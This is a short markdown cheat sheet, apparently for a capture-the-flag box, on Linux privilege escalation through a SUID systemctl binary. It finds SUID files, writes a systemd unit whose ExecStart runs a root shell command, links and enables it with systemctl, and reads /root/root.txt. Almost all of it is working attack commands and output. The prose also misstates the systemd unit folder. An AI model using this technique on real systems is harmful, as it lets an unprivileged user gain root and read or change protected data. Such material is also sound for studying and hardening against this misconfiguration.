# Privilege Escalation

## Escalate Privilege

```bash
find / -user root -perm -4000 -exec ls -ldb {} \;
```

## Look for

```bash
/bin/systemctl
```

## Systemctl

```text
Systemctl is a controlling interface and inspection tool for the widely-adopted init system and service manager systemd. Systemd in turn is an init system and system manager that is widely becoming the new standard for Linux machines. So what can we do with systemctl?

Systemd initializes user space components that run after the Linux kernel has booted, as well as continuously maintaining those components throughout a system’s lifecycle. These tasks are known as units, and each unit has a corresponding unit file. We can create our own unit file and let systemd start it. Normally systemctl will look for unit files in the default folder, which is /etc/system/systemd. But we don’t have the permission to write to that folder. So how can we create an unit file and let systemctl start it? We use an enviroment variable.
```

## Execute

```bash
$ eop=$(mktemp).service
$ echo '[Service]
> ExecStart=/bin/sh -c "cat /root/root.txt > /tmp/output"
> [Install]
> WantedBy=multi-user.target' > $eop
```

## Remember

```text
Inside the unit file we entered a command which will let shell execute the command cat and redirect the output of cat to a file called output in the folder tmp. And finally we use the /bin/systemctl program to enable the unit file.
```

## Next

```bash
$ /bin/systemctl link $eop
Created symlink from /etc/systemd/system/tmp.x1uzp01alO.service to /tmp/tmp.x1uzp01alO.service.
$ /bin/systemctl enable --now $eop
Created symlink from /etc/systemd/system/multi-user.target.wants/tmp.x1uzp01alO.service to /tmp/tmp.x1uzp01alO.service.
```

## Last

```bash
cat /tmp/output
```
